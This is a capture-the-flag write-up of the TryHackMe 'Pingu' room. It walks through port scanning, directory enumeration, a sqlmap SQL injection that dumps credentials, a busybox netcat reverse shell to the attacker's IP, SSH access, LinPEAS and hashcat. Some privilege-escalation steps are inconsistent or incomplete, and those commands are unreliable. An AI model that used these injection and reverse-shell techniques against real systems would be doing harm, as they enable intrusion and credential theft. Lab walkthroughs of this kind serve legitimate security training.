![](https://tryhackme-images.s3.amazonaws.com/room-icons/282c55307eada4ad18a0b06e4d65ff34.jpeg "TryHackMe")

- - - 
created : 22-07-2025 

Tags : #easy 
- - - 
# Objective

Hello there my name is Pingu. I've come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn't eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server. As all penguins are natural experts in penetration testing, I figured I could get the key myself! Unfortunately he banned every IP from Antarctica, so I am unable to do anything to the server. Therefore I call upon you my dear ally to help me get my fish back! Naturally I'll be guiding you through the process.

Note: This room expects some basic pen testing knowledge, as I will not be going over every tool in detail that is used. While you can just use the room to follow through, some interest or experiencing in assembly is highly recommended
# Recon

## Rustscan - Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
└─$ rustscan -a 10.10.110.207 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where '404 Not Found' meets '200 OK'.

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.110.207:22
Open 10.10.110.207:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf+PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe+e4ZNbsCvTc1AaYKVC+oguSNmT
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=
|   256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```
# Enumeration

## HTTP (80)

We use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to find hidden files :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,html,txt -u http://10.10.110.207 

/.htaccess            (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
'/administrator.php'    (Status: 200) [Size: 409]


```

Boom.
# Exploit

## Web Exploitation

We go to the /administrator.php page :

![Pasted image 20250722210517.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250722210517.png)

### SQLmap

The admin page seems to give us a login form. In situations like this it is always worth it to check for "low-hanging fruit". In the case of login forms one of the first things to check for is SQL Injection.

Recommended Tool: [SQLmap](../../3%20-%20Tags/Hacking%20Tools/SQLmap.md)

Useful Flags:

|   |   |
|---|---|
|-u|Specifies which url to attack|
|--forms|Automatically selects parameters from <form> elements on the page|
|--dump|Used to retrieve data from the db once SQLI is found|
|-a|Grabs just about everything from the db|
Let's do it :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
└─$ sqlmap -u http://10.10.110.207/administrator.php --forms --dump

do you want to exploit this SQL injection? [Y/n] Y
[21:48:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[21:48:25] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[21:48:25] [INFO] fetching current database
[21:48:25] [INFO] retrieved: 'users'
[21:48:25] [INFO] fetching tables for database: 'users'
[21:48:25] [INFO] retrieved: 'users'
[21:48:25] [INFO] fetching columns for table 'users' in database 'users'
[21:48:26] [INFO] retrieved: 'username'
[21:48:26] [INFO] retrieved: 'varchar(100)'
[21:48:27] [INFO] retrieved: 'password'
[21:48:27] [INFO] retrieved: 'varchar(100)'
[21:48:27] [INFO] fetching entries for table 'users' in database 'users'
[21:48:27] [INFO] retrieved: 'secretpass'
[21:48:27] [INFO] retrieved: 'pingudad'
Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+

[21:48:27] [INFO] table 'users.users' dumped to CSV file '/home/mdn0x/.local/share/sqlmap/output/10.10.110.207/dump/users/users.csv'
[21:48:27] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/mdn0x/.local/share/sqlmap/output/results-07222025_0948pm.csv'                                                                                                                                        

[*] ending @ 21:48:27 /2025-07-22/
```

### Command Execution

It seems we have gained the ability to run commands! Since this is my old PC, I should still have a user account! Let's run a few test commands, and then try to gain access :

![Pasted image 20250723184412.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250723184412.png)

#### Reverse Shell

We set up our listener and execute the payload on the site, i used this and worked :

```bash
busybox nc 10.8.162.183 1337 -e sh             'https://www.revshells.com/'
```

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
└─$ nc -lvnp 1337             
listening on [any] 1337 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.144.132] 33006
ls
2591c98b70119fe624898b1e424b5e91.php
administrator.php
index.html
cd ..
ls
html
cd ..
ls
backups
cache
hidden
lib
local
lock
log
mail
opt
run
spool
tmp
www
cd hidden
ls
pass
cat pass
'pinguapingu'


cd home
l
ls
papa
pingu

```

## SSH

Now we have [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) access on the machine :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
└─$ ssh  pingu@10.10.144.132                      
The authenticity of host '10.10.144.132 (10.10.144.132)' can't be established.
ED25519 key fingerprint is SHA256:+hK0Xg1iyvZJUoO07v4g1UZ11QpuwY05deZS4BPEbbE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.144.132' (ED25519) to the list of known hosts.
pingu@10.10.144.132's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Mon Jan 20 14:14:47 2020
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

pingu@ubuntu:~$ ls
pingu@ubuntu:~$ pwd
/home/pingu
pingu@ubuntu:~$ cd ..
pingu@ubuntu:/home$ l
l: command not found
pingu@ubuntu:/home$ ls
papa  pingu
pingu@ubuntu:/home$ cd papa
pingu@ubuntu:/home/papa$ ls
pingu@ubuntu:/home/papa$ ls -la
total 36
drwxr-xr-x 5 papa papa 4096 Jan 15  2020 .
drwxr-xr-x 4 root root 4096 Jan 15  2020 ..
-rw------- 1 papa papa  627 Jan 16  2020 .bash_history
-rw-r--r-- 1 papa papa  220 Jan 15  2020 .bash_logout
-rw-r--r-- 1 papa papa 3771 Jan 15  2020 .bashrc
drwx------ 2 papa papa 4096 Jan 15  2020 .cache
drwxrwxr-x 2 papa papa 4096 Jan 15  2020 .nano
-rw-r--r-- 1 papa papa  655 Jan 15  2020 .profile
drwxrwxr-x 2 papa papa 4096 Jan 15  2020 .pwntools-cache-2.7
-rw-r--r-- 1 papa papa    0 Jan 15  2020 .sudo_as_admin_successful
pingu@ubuntu:/home/papa$ 

```
# Privilege Escalation

## LinPEAS

Let's copy  [LinPEAS](../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) via scp ([SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md)) and it will search for [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) vectors on the target :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
└─$ scp /usr/share/peass/linpeas/linpeas.sh  pingu@10.10.144.132:/tmp
pingu@10.10.144.132's password: 
linpeas.sh                                                                                  100%  932KB 447.3KB/s   00:02 
```

We check it and make it executable :

```bash
pingu@ubuntu:/tmp$ chmod -x linpeas.sh 
pingu@ubuntu:/tmp$ ls -x
linpeas.sh  systemd-private-3a4c7756dbc84b389b13ad250700bf9c-systemd-timesyncd.service-ld2B6p  VMwareDnD
pingu@ubuntu:/tmp$ 
```

Now we can run it :

```bash
pingu@ubuntu:/tmp$ ./linpeas.sh 

╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                               
-r-sr-xr-x 1 root papa 7.4K Jan 16  2020 /opt/secret/root (Unknown SUID binary!)          
```

## After Lesson

Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is `$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.`

### Hashcat

We can use [Hashcat](../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) to crack the hash :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pingu]
└─$ hashcat -a 3 -m 1400 /usr/share/wordlists/rockyou.txt

'love2fish'
```

Finish .

' Now that I have the root password, I can get any fish he attempts to hide from me :). '